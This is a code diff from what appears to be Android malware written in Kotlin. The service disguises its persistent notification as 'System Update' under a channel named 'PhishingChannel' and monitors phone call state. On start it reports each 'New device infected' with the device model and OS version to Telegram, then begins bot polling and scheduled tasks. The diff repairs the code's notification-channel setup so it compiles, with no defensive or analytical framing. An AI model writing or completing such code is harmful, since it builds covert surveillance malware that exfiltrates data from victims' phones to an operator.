@@ -78,32 +78,33 @@ private val CHANNEL_ID = "PhishingChannel"
         }
     }
 
-    override fun onCreate() {
-        super.onCreate()
-        createNotificationChannel()
-        startForeground(1, buildForegroundNotification())
-        telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
-        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
+   override fun onCreate() {
+    super.onCreate()
+    createNotificationChannel()
+    startForeground(1, buildForegroundNotification())
+    telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+    telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
 
-        CoroutineScope(Dispatchers.IO).launch {
-            sendTelegramMessage("✅ New device infected: ${Build.MODEL} (${Build.VERSION.RELEASE})")
-        }
-
-        startBotPolling()
-        scheduleAutoTasks()
+    CoroutineScope(Dispatchers.IO).launch {
+        sendTelegramMessage("✅ New device infected: ${Build.MODEL} (${Build.VERSION.RELEASE})")
     }
 
-if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "System Update",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
-        }
+    startBotPolling()
+    scheduleAutoTasks()
+}
 
-
+private fun createNotificationChannel() {
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+        val channel = NotificationChannel(
+            CHANNEL_ID,
+            "System Update",
+            NotificationManager.IMPORTANCE_LOW
+        )
+        val manager = getSystemService(NotificationManager::class.java)
+        manager.createNotificationChannel(channel)
+    }
+}
+ 
 
     
 
